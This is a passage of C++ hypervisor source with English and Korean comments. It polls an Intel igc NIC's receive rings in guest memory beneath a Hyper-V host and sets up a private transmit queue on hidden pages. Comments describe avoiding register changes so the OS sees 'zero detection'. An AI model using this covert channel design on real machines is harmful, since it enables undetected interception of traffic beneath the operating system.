                        memory_manager::map_guest_physical(slat, buf_addr));

                    if (pkt_data)
                    {
                        // Copy guest memory to local buffer (race condition prevention)
                        static std::uint8_t rx_local_buf[1514];
                        crt::copy_memory(rx_local_buf, pkt_data, pkt_len);

                        processed |= process_rx_packet(rx_local_buf, pkt_len);
                    }
                }
                else if (pkt_len > 0) {
                    // cache miss - DD=1이지만 buf_addr가 0
                }
            }

            idx = (idx + 1) % rxq.count;
            checked++;
        }

        // ================================================================
        // [DESYNC FIX] Detect our_index stuck due to ring wrap desync.
        // ================================================================
        // Problem: OS driver recycles descriptors (DD=0) between our_index
        //   and current RDH. HV finds DD=0 at our_index, breaks immediately.
        //   our_index never advances. NIC keeps going, gap grows. Permanent stuck.
        // Cause: OS NAPI poll recycles faster than HV reads, or NIC ring wraps.
        // Symptom: checked==0 (no packets processed) but idx != rx_head (gap exists).
        // Fix: If DD=0 at our_index and gap > threshold, snap to RDH.
        //   This skips stale descriptors. Some packets lost but NIC recovers.
        // Evidence: nic_diag showed our_index=527 RDH=420 = 917 gap = permanent death.
        // Parsec "fix": massive traffic eventually wraps RDH past our_index again.
        // ================================================================
        if (checked == 0 && idx != rx_head)
        {
            const std::uint32_t gap = (rx_head - idx + rxq.count) % rxq.count;
            // gap 1-4 = normal NIC/HV timing jitter (DD write race).
            // gap > 4 = real desync, our_index stuck behind recycled descriptors.
            // Threshold avoids false positives that cause unnecessary refresh + packet loss.
            if (gap > 4)
            {
                rxq.our_index = rx_head;
                if (rxq.buf_cache_valid)
                    nic::refresh_igc_queue_buf_cache(&slat, q);
                continue;
            }
        }

        rxq.our_index = idx;

        // [핵심 0xFA] post-poll refresh도 유지 (RDT-range 기반)
        // proactive cache가 놓친 부분을 보완
        if (rxq.buf_cache_valid)
            nic::refresh_igc_queue_buf_cache(&slat, q);
    }

    ip_frag::reasm_tick();
    return processed;
}

// ============================================================================
// [핵심] RX Ring Polling - Intel igc Fallback (멀티큐 미초기화시)
// ============================================================================
// 멀티큐 init 실패시 old-style Q0 단일큐 폴링.
// nic::state.rx_ring_gpa + nic::rx_buf_cache[] 사용 (read_ring_config에서 설정됨)
// advanced descriptor 파싱은 동일 (legacy polling은 adv desc 처리 불가!)
// ============================================================================

static std::uint8_t poll_rx_ring_intel_igc_fallback()
{
    const cr3 slat = cached_slat_cr3;
    std::uint8_t processed = 0;

    // [핵심 버그 수정] refresh를 폴링 전에 하면 캐시된 주소가 덮어씌워짐
    // (구) if (nic::rx_buf_cache_valid) refresh_rx_buf_cache_igc();

    const std::uint32_t rx_head = nic::read_reg(&slat, nic::reg_rdh(nic::state));
    const std::uint32_t rx_count = nic::state.rx_count;
    if (rx_count == 0) return 0;

    std::uint32_t idx = nic::state.our_rx_index;
    std::uint32_t checked = 0;
    constexpr std::uint32_t MAX_PACKETS_PER_POLL = 32;

    while (idx != rx_head && checked < MAX_PACKETS_PER_POLL)
    {
        const std::uint64_t desc_gpa = nic::state.rx_ring_gpa + idx * 16;
        const auto* wb = static_cast<const nic::igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!wb) break;

        if (!(wb->staterr & nic::IGC_RXD_STAT_DD)) break;


        if (wb->staterr & nic::IGC_RXD_STAT_EOP)
        {
            const std::uint16_t pkt_len = wb->length;

            std::uint64_t buf_addr = 0;
            if (nic::rx_buf_cache_valid && idx < nic::MAX_RX_BUF_CACHE)
                buf_addr = nic::rx_buf_cache[idx];

            if (buf_addr != 0 && pkt_len > 0 && pkt_len <= 1514)
            {
                const auto* pkt_data = static_cast<const std::uint8_t*>(
                    memory_manager::map_guest_physical(slat, buf_addr));

                if (pkt_data)
                {
                    // [핵심] Guest 메모리 로컬 복사 (race condition 방지)
                    static std::uint8_t rx_local_buf_fb[1514];
                    crt::copy_memory(rx_local_buf_fb, pkt_data, pkt_len);
                    processed |= process_rx_packet(rx_local_buf_fb, pkt_len);
                }
            }
            else if (pkt_len > 0) {
            }
        }

        idx = (idx + 1) % rx_count;
        checked++;
    }

    // [DESYNC FIX] Same as igc multi-queue path.
    // Snap our_index to RDH if DD=0 but gap exists.
    if (checked == 0 && idx != rx_head)
    {
        const std::uint32_t gap = (rx_head - idx + rx_count) % rx_count;
        if (gap > 4)
        {
            nic::state.our_rx_index = rx_head;
            if (nic::rx_buf_cache_valid)
                refresh_rx_buf_cache_igc();
            return 0;
        }
    }

    nic::state.our_rx_index = idx;

    // [핵심 버그 수정] 폴링 완료 후에 refresh (fallback 경로)
    if (nic::rx_buf_cache_valid)
        refresh_rx_buf_cache_igc();

    ip_frag::reasm_tick();
    return processed;
}

// ============================================================================
// RX Ring Polling - Realtek
// [핵심] Buffer Address Pre-Cache 전략:
// 문제: 다른 vCPU에서 드라이버가 descriptor를 즉시 재활용 → addr=0 race
// 해결: 초기화 시 모든 descriptor의 buffer address를 캐시
//       폴링 때는 opts1만 읽음 (4바이트 = x86 자연 atomic)
//       캐시된 addr로 패킷 데이터 접근
// ============================================================================


// ============================================================================
// RX Ring Polling - Dispatcher
// ============================================================================

static std::uint8_t poll_rx_ring()
{
    if (nic::state.nic_type == nic::nic_type_t::INTEL)
    {
        // [핵심] igc(I225/I226): 멀티큐 폴링 (4개 RX 큐, 읽기 전용!)
        if (nic::state.intel_gen == nic::intel_gen_t::IGC && nic::igc_num_active_queues > 0)
            return poll_rx_ring_intel_igc();
        // [핵심] fallback: 멀티큐 미초기화시에도 advanced desc면 igc 폴링 사용
        // legacy polling은 advanced descriptor 파싱 불가!
        else if (nic::state.use_adv_desc)
            return poll_rx_ring_intel_igc_fallback();
        else
            return poll_rx_ring_intel_legacy();
    }
    return 0;
}

// ============================================================================
// Network Setup
// ============================================================================

void network::set_up()
{
    cached_slat_cr3 = slat::hyperv_cr3();

    constexpr std::uint32_t RESPONSE_PAGES = 512;
    response_buffer = static_cast<std::uint8_t*>(heap_manager::allocate_page());
    response_buffer_size = 0x1000;

    for (std::uint32_t i = 1; i < RESPONSE_PAGES; i++)
    {
        void* page = heap_manager::allocate_page();
        if (page == response_buffer + 0x1000 * i) {
            response_buffer_size += 0x1000;
        }
        else {
            break;
        }
    }

    tx_frame_buffer = static_cast<std::uint8_t*>(heap_manager::allocate_page());

    reasm_buffer = static_cast<std::uint8_t*>(heap_manager::allocate_page());
    std::uint32_t reasm_size = 0x1000;
    for (std::uint32_t i = 1; i < 64; i++)
    {
        void* page = heap_manager::allocate_page();
        if (page == reasm_buffer + 0x1000 * i) {
            reasm_size += 0x1000;
        }
        else {
            break;
        }
    }

    if (!response_buffer || !tx_frame_buffer || !reasm_buffer)
    {
        is_initialized = 0;
        return;
    }

    crt::set_memory(response_buffer, 0, response_buffer_size);
    crt::set_memory(tx_frame_buffer, 0, 0x1000);

    ip_frag::reasm_init(reasm_buffer);

    if (!nic::discover_nic(&cached_slat_cr3)) {
        is_initialized = 0;
        return;
    }

    // Read MAC address for TX frame construction and diagnostics
    nic::read_mac(&cached_slat_cr3);

    if (!nic::read_ring_config(&cached_slat_cr3)) {
        is_initialized = 0;
        return;
    }

    // [핵심] MSI-X/MSI capability 탐색 — CF8 PCI config space
    {
        const std::uint8_t bus = nic::state.bus;
        const std::uint8_t dev = nic::state.dev;
        const std::uint8_t func = nic::state.func;

        // Status register bit4 = Capability List
        std::uint16_t status = nic::pci_cf8_read16(bus, dev, func, 0x06);
        if (status & 0x10)
        {
            std::uint8_t cap_ptr = static_cast<std::uint8_t>(
                nic::pci_cf8_read16(bus, dev, func, 0x34) & 0xFF);
            for (int safety = 0; safety < 48 && cap_ptr >= 0x40; safety++)
            {
                std::uint16_t cap_hdr = nic::pci_cf8_read16(bus, dev, func, cap_ptr);
                std::uint8_t cap_id = static_cast<std::uint8_t>(cap_hdr & 0xFF);
                std::uint8_t next = static_cast<std::uint8_t>((cap_hdr >> 8) & 0xFF);

                if (cap_id == nic::PCI_CAP_MSIX)
                {
                    nic::msix_cap_offset = cap_ptr;
                    nic::msix_orig_msgctl = nic::pci_cf8_read16(bus, dev, func, cap_ptr + 2);
                }
                else if (cap_id == nic::PCI_CAP_MSI)
                {
                    nic::msi_cap_offset = cap_ptr;
                }
                cap_ptr = next;
            }
        }
    }

    // ================================================================
    // [FIX] CF8 capability 탐색 실패 시 ECAM 물리메모리로 직접 읽기
    // ================================================================
    // Hyper-V가 CF8/CFC PCI config space를 가상화 → Status bit4=0 → cap list 못 찾음
    // ECAM은 물리 메모리 매핑이므로 NPT walk로 직접 접근 가능
    // ================================================================
    if (nic::msix_cap_offset == 0 && nic::ecam_base_detected != 0)
    {
        const std::uint64_t ecam_dev_base = nic::ecam_base_detected
            + (static_cast<std::uint64_t>(nic::state.bus) << 20)
            + (static_cast<std::uint64_t>(nic::state.dev) << 15)
            + (static_cast<std::uint64_t>(nic::state.func) << 12);

        // ECAM으로 PCI config space 4096바이트 중 처음 256바이트 접근
        const auto* cfg = static_cast<const volatile std::uint8_t*>(
            memory_manager::map_guest_physical(cached_slat_cr3, ecam_dev_base));
        if (cfg)
        {
            // Status register (offset 0x06) bit 4 = Capabilities List
            const std::uint16_t ecam_status = *reinterpret_cast<const volatile std::uint16_t*>(cfg + 0x06);
            std::uint8_t cap_ptr = cfg[0x34]; // Capability pointer

            // status bit4 없어도 cap_ptr 유효하면 시도
            if ((ecam_status & 0x10) || cap_ptr >= 0x40)
            {
                for (int safety = 0; safety < 48 && cap_ptr >= 0x40; safety++)
                {
                    const std::uint8_t cap_id = cfg[cap_ptr];
                    const std::uint8_t next = cfg[cap_ptr + 1];

                    if (cap_id == nic::PCI_CAP_MSIX)
                    {
                        nic::msix_cap_offset = cap_ptr;
                        nic::msix_orig_msgctl = *reinterpret_cast<const volatile std::uint16_t*>(
                            cfg + cap_ptr + 2);
                    }
                    else if (cap_id == nic::PCI_CAP_MSI)
                    {
                        nic::msi_cap_offset = cap_ptr;
                    }

                    cap_ptr = next;
                }
            }
        }
    }

    // [핵심] igc의 경우 멀티큐 RX 초기화 (4개 큐 전부 폴링)
    // MRQC/RETA 수정 없이 읽기 전용으로 모든 큐에서 패킷 수신!
    if (nic::state.intel_gen == nic::intel_gen_t::IGC)
    {
        if (!nic::read_igc_multi_queue_config(&cached_slat_cr3))
        {
            is_initialized = 0;
            return;
        }

        // [핵심] TX Queue 1 초기화 - OS Q0과 완전 격리된 전용 TX 경로
        // hidden page 2장 할당 (descriptor ring + data buffer)
        // VA→GPA 변환으로 NIC에 물리주소 등록
        if (nic::heap_va_pa_valid)
        {
            nic::setup_igc_hv_tx_queue(&cached_slat_cr3);
            // 실패해도 계속 진행 (fallback: packets_dropped 증가)
        }
    }

    // [핵심] MRQC/RETA 수정 완전 제거 - NIC 레지스터 변조 0!
    // 이전: MRQC=0으로 RSS 끔 + RETA 클리어 → OS 네트워크 성능 저하 + 감지 벡터
    // 현재: 4개 큐 전부 읽기 전용 폴링 → 제로 변조, 제로 감지

    is_initialized = 1;
    nic::state.initialized = 1;
}

// ============================================================================
// Process Pending (called every VMEXIT)
// ============================================================================

// ============================================================================
// [Q1 Health Monitor] Periodic HW register check + auto-recovery
// ============================================================================
// Reads TXDCTL1 and TDBAL1 via host PA bypass (not guest NPT path).
// Safe: v5.0-v5.3 failures were caused by guest-path MMIO reads
//   interfering with OS igc driver timing. Host PA bypass is invisible
//   to OS because it never touches NPT or guest address space.
//
// Detection: TXDCTL1.ENABLE=0 or TDBAL1=0 means Q1 is dead.
//   Causes: NIC global reset (CTRL.RST), D3->D0 power transition,
//   igc watchdog timeout, OS driver reinit.
//
// Recovery: Full setup_igc_hv_tx_queue() which reprograms all Q1 regs:
//   TDBAL, TDBAH, TDLEN, TDH, TDT, TXDCTL. Reuses existing
//   heap-allocated descriptor ring and data buffers (no new alloc needed).
// ============================================================================
static void check_q1_health()
{
    if (!nic::igc_hv_tx.initialized) return;
    // mmio_bypass guard removed: 0xE000 page NPT present=1 (not intercepted)
    // read_reg uses normal map_guest_physical path which works fine


    // Read live HW values via host PA bypass
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t txdctl = nic::read_reg(&slat, nic::IGC_TXQ1_TXDCTL);
    const std::uint32_t tdbal = nic::read_reg(&slat, nic::IGC_TXQ1_TDBAL);


    // Check if Q1 is alive: only HW register checks.
    // DO NOT check nb_tx_free==0 here - it's normal during burst TX (91 chunks).
    // Previous tx_stuck detection caused false Q1 re-inits -> ring corruption -> NIC death.
    const bool enable_lost = !(txdctl & nic::IGC_TXDCTL_ENABLE);
    const bool tdbal_zero = (tdbal == 0);

    if (!enable_lost && !tdbal_zero)
        return;  // Q1 healthy

    // Q1 is dead - determine reason and recover
    std::uint32_t reason = 0;
    if (enable_lost) reason |= 1;
    if (tdbal_zero)  reason |= 2;

    // Full Q1 re-init: reprograms TDBAL/TDBAH/TDLEN/TDH/TDT/TXDCTL
    // Descriptor ring and data buffers already allocated in heap
    // (setup_igc_hv_tx_queue skips alloc if desc_ring_va != nullptr)
    nic::setup_igc_hv_tx_queue(&slat);


    // ================================================================
    // [RX RE-SYNC] TDBAL=0 means CTRL.RST wiped ALL queues.
    // OS driver re-inits Q0 with potentially new ring GPA, new RDH/RDT.
    // Without re-sync: HV uses stale ring_gpa + old our_index
    //   -> reads wrong memory -> no valid packets -> timeout cascade.
    // FIX: re-read all RX queue config (ring_gpa, our_index, buf_cache).
    // This is the same init that runs at startup.
    // Only on TDBAL=0 (full NIC reset), not on TXDCTL toggle (Q1-only issue).
    // ================================================================
    if (tdbal_zero)
    {
        nic::read_igc_multi_queue_config(&slat);
    }

    // [DESYNC FIX] Kill deferred_tx: ring reset loses all in-flight chunks.
    // Client receives clean timeout -> retries whole request.
    if (deferred_tx.active) {
        deferred_tx.active = 0;
    }
}

std::uint8_t network::process_pending()
{
    // ====================================================================
    // [핵심] 멀티 vCPU 경쟁 방지 (try-lock)
    // ====================================================================
    // 문제: 여러 vCPU가 동시에 VMEXIT → 모두 poll_rx_ring() → 같은 descriptor
    //       중복 처리 → 2-4x 응답 전송 → TX ring 경쟁 → stuck → HV 사망
    // 해결: 1개 vCPU만 네트워크 처리, 나머지는 즉시 return
    // _InterlockedCompareExchange: lock cmpxchg (x86 atomic)
    // ====================================================================
    // ====================================================================
    // [LOCK] Simple try-lock. If held, skip this VMEXIT.
    // ====================================================================
    // IMPORTANT: lock_timeout was REMOVED. It caused TX ring race conditions:
    //   force-release while holder still active → 2 vCPUs access ring → corruption → NIC death.
    //   Observed: lock_timeout_count=447 = 447 race conditions in single session.
    // Simple try-lock is safe: if lock is held, this vCPU skips. Lock holder
    //   always completes and releases (all paths verified with lock release).
    // ====================================================================
    static volatile long rx_processing_lock = 0;
    if (_InterlockedCompareExchange(&rx_processing_lock, 1, 0) != 0)
        return 0;  // another vCPU processing, skip

    if (!is_initialized)
    {
        poll_counter++;
        if (poll_counter % 100000 == 0)
        {
            cached_slat_cr3 = slat::hyperv_cr3();
            if (nic::state.mmio_base_gpa == 0)
                nic::discover_nic(&cached_slat_cr3);
            if (nic::state.mmio_base_gpa != 0 && nic::state.rx_count == 0)
            {
                if (nic::read_ring_config(&cached_slat_cr3))
                {
                    // [핵심] retry 경로에서도 멀티큐 + TX Q1 초기화 수행!
                    if (nic::state.intel_gen == nic::intel_gen_t::IGC)
                    {
                        nic::read_igc_multi_queue_config(&cached_slat_cr3);

                        // TX Queue 1 격리 초기화
                        if (nic::heap_va_pa_valid && !nic::igc_hv_tx.initialized)
                            nic::setup_igc_hv_tx_queue(&cached_slat_cr3);
                    }

                    is_initialized = 1;
                    nic::state.initialized = 1;
                }
            }
        }
        _InterlockedExchange(&rx_processing_lock, 0);
        return 0;
    }

    const std::uint64_t now = read_tsc();

    // ====================================================================
    // ====================================================================
    // [v5.4] VMEXIT keepalive 완전 제거
    // ====================================================================
    // v5.0: TXDCTL+TDBAL 체크 → NIC 사망
    // v5.1: 조건부 TDBAL → NIC 사망
    // v5.3: TDBAL==0만 → NIC 사망
    // 결론: 매 VMEXIT MMIO read 자체가 OS NIC driver 타이밍 간섭
    //       TDBAL read도 NIC config space 접근 → OS igc driver와 충돌
    // v4 (keepalive 0, inject pre-check만): 99 MB/s, p2=0/0 검증됨
    // TDBAL=0 복구는 inject pre-check 내부에서 처리
    // ====================================================================

    if ((now - last_poll_tsc) < POLL_INTERVAL_TSC)
    {
        // [핵심] throttle 중이어도 pending TX는 처리!
        // VMEXIT 빈도가 높으므로 TX를 빨리 비워야 함
        if (deferred_tx.active) {
            flush_deferred_tx();
        }
        _InterlockedExchange(&rx_processing_lock, 0);
        return 0;
    }
    last_poll_tsc = now;

    poll_counter++;

    // [Q1 Health] Every 100 polls.
    // check_q1_health = 2 MMIO reads (TXDCTL + TDBAL).
    // Detects OS CTRL reset that kills Q1 silently.
    // Note: Parsec dependency is fixed by DESYNC FIX, not by faster health checks.
    if ((poll_counter % 100) == 0)
    {
        check_q1_health();
    }

    if (deferred_tx.active) {
        flush_deferred_tx();
        if (deferred_tx.active) {
            _InterlockedExchange(&rx_processing_lock, 0);
            return 1;
        }
    }

    const std::uint8_t result = poll_rx_ring();

    // [핵심] lock 해제 - 반드시 모든 경로에서 해제!
    _InterlockedExchange(&rx_processing_lock, 0);
    return result;
}